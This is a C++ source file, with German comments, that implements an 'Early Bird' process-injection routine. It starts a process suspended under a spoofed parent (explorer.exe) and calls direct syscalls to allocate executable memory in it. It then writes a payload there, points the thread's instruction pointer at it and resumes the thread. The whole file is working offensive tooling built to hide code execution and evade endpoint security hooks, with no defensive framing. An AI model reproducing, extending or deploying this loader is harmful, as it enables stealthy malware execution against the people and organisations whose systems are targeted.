#include "EarlyBirdInjection.h"
#include "util.h"
#include <stdexcept>
#include <tlhelp32.h>

// Die globalen Syscall-Funktionen werden jetzt an anderer Stelle deklariert und initialisiert.
extern "C" {
    NTSTATUS SyscallNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS SyscallNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS SyscallNtGetContextThread(HANDLE, PCONTEXT);
    NTSTATUS SyscallNtSetContextThread(HANDLE, PCONTEXT);
    NTSTATUS SyscallNtResumeThread(HANDLE, PULONG);
}

// Der Konstruktor initialisiert nur noch das NTDLL-Handle.
EarlyBirdInjection::EarlyBirdInjection(HMODULE hNtdllParam) : hNtdll(hNtdllParam) {
    if (!hNtdll) {
        throw std::runtime_error("EarlyBirdInjection requires a valid handle to NTDLL.");
    }
}

EarlyBirdInjection::~EarlyBirdInjection() {}

InjectionResult EarlyBirdInjection::inject(
    const std::string& processName, 
    const std::vector<unsigned char>& payloadBundle,
    size_t codeOffset) 
{
    HANDLE hParentProcess = Phantom::Util::findProcessByName("explorer.exe");
    if (hParentProcess == NULL) {
        return InjectionResult::PROCESS_NOT_FOUND;
    }

    STARTUPINFOEXA siEx = { sizeof(siEx) };
    PROCESS_INFORMATION pi;
    SIZE_T attributeListSize;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeListSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attributeListSize);
    UpdateProcThreadAttribute(siEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!CreateProcessA(NULL, (LPSTR)processName.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) {
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hParentProcess);
        return InjectionResult::PROCESS_CREATION_FAILED;
    }
    
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hParentProcess);

    PVOID remoteBuffer = NULL;
    SIZE_T regionSize = payloadBundle.size();
    NTSTATUS status = SyscallNtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) { TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return InjectionResult::MEMORY_ALLOCATION_FAILED; }

    SIZE_T bytesWritten;
    status = SyscallNtWriteVirtualMemory(pi.hProcess, remoteBuffer, (PVOID)payloadBundle.data(), payloadBundle.size(), &bytesWritten);
    if (status != 0 || bytesWritten != payloadBundle.size()) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::MEMORY_WRITE_FAILED; 
    }

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteBuffer, payloadBundle.size(), PAGE_EXECUTE_READ, &oldProtect);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    status = SyscallNtGetContextThread(pi.hThread, &ctx);
    if (status != 0) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }

    // Setze den Instruction Pointer auf den Anfang unseres Codes
    // und die Argumente für die x64-Aufrufkonvention (RCX, RDX).
    ctx.Rip = (DWORD64)((char*)remoteBuffer + codeOffset);
    ctx.Rcx = (DWORD64)remoteBuffer; // 1. Argument: Basisadresse des Payloads
    ctx.Rdx = (DWORD64)remoteBuffer; // 2. Argument: Zeiger auf Parameter (hier identisch)

    status = SyscallNtSetContextThread(pi.hThread, &ctx);
    if (status != 0) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }

    status = SyscallNtResumeThread(pi.hThread, NULL);
    if (status != 0) { 
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return InjectionResult::SUCCESS;
} 